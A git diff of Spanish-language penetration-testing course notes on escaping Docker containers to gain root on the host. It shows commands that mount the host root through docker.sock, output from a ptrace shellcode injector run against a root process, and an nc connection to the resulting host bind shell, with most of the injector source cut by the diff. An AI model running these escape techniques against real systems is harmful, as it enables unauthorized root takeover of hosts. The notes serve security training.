@@ -2,34 +2,37 @@
 
 Tags: #Linux #DockerBreackout #Escalada #Root #Privilegios 
 
-En la clase actual, exploraremos diversas técnicas para abusar de **Docker** con el objetivo de elevar nuestros privilegios de usuario y escapar del contenedor hacia la máquina host. Examinaremos situaciones específicas y discutiremos las implicaciones de seguridad en cada caso.
+Explorar diversas técnicas para abusar de **Docker** con el objetivo de elevar nuestros privilegios de usuario y escapar del contenedor hacia la máquina host.
 
 Las técnicas que se tratarán en esta clase incluyen:
 
-- Uso de monturas en el despliegue de contenedores para acceder a archivos privilegiados del sistema host. Analizaremos cómo un atacante puede aprovechar las monturas para manipular los archivos del host y comprometer la seguridad del sistema.
-- Despliegue de contenedores con la compartición de procesos (**–pid=host**) y permisos privilegiados (**–privileged**). Veremos cómo inyectar un shellcode malicioso en un proceso en ejecución como root, lo que podría permitir al atacante tomar control del sistema.
-- Uso de **Portainer** para administrar el despliegue de un contenedor. Discutiremos cómo, mediante el empleo de monturas, un atacante podría ingresar y manipular archivos privilegiados del sistema host y escapar del contenedor.
-- Abuso de la **API** de **Docker** por el puerto **2375** para la creación de imágenes, despliegue de contenedores e inyección de comandos privilegiados en la máquina host. Examinaremos cómo un atacante puede explotar la API de Docker para comprometer la seguridad del host y lograr la ejecución de comandos con privilegios elevados.
-
-Al finalizar esta clase, comprenderás las vulnerabilidades potenciales asociadas con Docker y aprenderás a identificar los posibles riesgos de seguridad en entornos basados en contenedores.
-
+- Uso de monturas en el despliegue de contenedores para acceder a archivos privilegiados del sistema host. Analizar cómo un atacante puede aprovechar las monturas para manipular los archivos del host y comprometer la seguridad del sistema.
+- Despliegue de contenedores con la compartición de procesos (**–pid=host**) y permisos privilegiados (**–privileged**). Ver cómo inyectar un shellcode malicioso en un proceso en ejecución como root, lo que podría permitir al atacante tomar control del sistema.
+- Uso de **Portainer** para administrar el despliegue de un contenedor. Discutir cómo, mediante el empleo de monturas, un atacante podría ingresar y manipular archivos privilegiados del sistema host y escapar del contenedor.
+- Abuso de la **API** de **Docker** por el puerto **2375** para la creación de imágenes, despliegue de contenedores e inyección de comandos privilegiados en la máquina host. Examinar cómo un atacante puede explotar la API de Docker para comprometer la seguridad del host y lograr la ejecución de comandos con privilegios elevados.
 
 ## Docker Breakout
 
-Estando dentro de un contenedor Docker vamos a poder escalar privilegios 'escapando' del contenedor. 
+```bash 
+# Confirmar la estancia dentro de un contenedor 
+❯ hostname     # Muestra un nombre raro 
+❯ ip a show    # Muestra eth0 como una IP que no sea la que se ataca desde un inicio 
+❯ ls -la /     # Encontrar .dockerenv en la raiz
+```
 
+Estando dentro de un contenedor Docker vamos a poder escalar privilegios 'escapando' del contenedor. 
 ### Forma 1
 
 ```bash 
 ❯ docker run --rm -dit -v /var/run/docker.sock:/var/rundocker.sock --name ubuntuServer ubuntu  # Nos crearemos un contenedor 1 de la imagen descargada anteriormente llamada 'ubuntuServer' y le diremos que queremos que el 'docker.sock' de la maquina victima nos lo copie en la misma ruta del contenedor
+
 ❯ docker exec -it ubuntuServer bash        # Ingresamos al contenedor 'ubuntuServer' por medio de una bash como root
 	❯ apt install docker.io                    # Dentro del contenedor instalamos Docker
 	❯ docker images                            # Miramos las imagenes  
 	❯ docker ps                                # Miramos los contenedores 
-	❯ docker run --rm -dit -v /:/mnt/root --name privesc ubuntu # Desplegaremos un contenedor con una montura de la raiz de la primer maquina y que la monte en el dir /mnt/root del contenedor 2, esto se logra porque nos etsamos comunicando con el unix socket file de la maquina host, la raiz del nuevo contenedor hara alucion a la raiz de la maquina actual (primer maquina) 
-	❯ docker exec -it privesc bash        # Ingresamos al contenedor 'privesc' y ahi podremos darle permisos SUID a la bash, por lo que se vera reflejada en la maquina host
+	❯ docker run --rm -dit -v /:/mnt/root --name privesc ubuntu # Desplegar un contenedor con una montura de la raiz de la primer maquina y que la monte en el dir /mnt/root del contenedor 2, esto se logra porque nos etsamos comunicando con el unix socket file de la maquina host, la raiz del nuevo contenedor hara alucion a la raiz de la maquina actual (primer maquina) 
+	❯ docker exec -it privesc bash        # Ingresar al contenedor 'privesc' y ahi podremos darle permisos SUID a la bash, por lo que se vera reflejada en la maquina host
 ```
-
 
 ### Forma 2
 
@@ -52,7 +55,7 @@ Usaremos el código de la pagina anterior para poder hacer el ataque
 # Con ese servicio abierto nos montaremos una BindShell
 ```
 
-Creamos el archivo llamado 'infect.c' que ejecutaremos en el contenedor, el cual se aprovechara del proceso que esta corriendo root, el cual le agregaremos parte del CVE 41128
+Crear el archivo llamado 'infect.c' que ejecutar en el contenedor, el cual se aprovechará del proceso que esta corriendo root, el cual le agregaremos parte del CVE 41128
 ```bash
 #include <stdio.h>
 #include <stdlib.h>
@@ -156,22 +159,18 @@ main (int argc, char *argv[])
 ❯ ps -faux | grep python            # Buscamos el PID que le pasaremos al archivo, para este caso es el 14326 ya que siempre cambia 
 ❯ ./inject 14326
 
-+ Tracing process 14326
-+ Waiting for process...
-+ Getting Registers
-+ Injecting shell code at 0x7f80246aad47
-+ Setting instruction pointer to 0x7f80246aad49
-+ Run it!
+	+ Tracing process 14326
+	+ Waiting for process...
+	+ Getting Registers
+	+ Injecting shell code at 0x7f80246aad47
+	+ Setting instruction pointer to 0x7f80246aad49
+	+ Run it!
 ```
 
-Esto significa que te abre el puerto 5600 en la maquina host. 
 ```bash 
-❯ nc 172.17.0.1 5600                 # Nos conectamos al puerto 5600 del contenedor y esta es la direccion del host, por lo tanto seremos root en el host 
-❯ script /dev/null -c bash           # Activar la bash 
-❯ Ctrl + z
-# Le damos el tratamiento a la bash 
+# Esto significa que te abre el puerto 5600 en la maquina host
+❯ nc 172.17.0.1 5600    # Obtener la revershell como root        
 ```
-
 
 ### Forma 3 
 
